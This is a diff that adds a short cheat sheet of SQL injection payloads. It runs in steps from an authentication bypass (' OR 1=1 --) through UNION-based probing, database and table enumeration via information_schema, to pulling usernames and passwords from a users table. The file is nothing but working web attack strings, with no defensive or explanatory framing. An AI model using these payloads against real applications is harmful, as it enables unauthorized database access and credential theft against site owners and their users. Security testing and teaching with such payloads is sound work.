@@ -1,0 +1,15 @@
+Basic SQL Injection:
+
+' OR 1=1 --
+Union-based SQL Injection:
+
+' UNION SELECT 1,2,3 --
+Fetching Database Information:
+
+' UNION SELECT 1, database(), user() --
+Enumerating Tables and Columns:
+
+' UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema=database() --
+Extracting Data:
+
+' UNION SELECT 1, username, password FROM users --
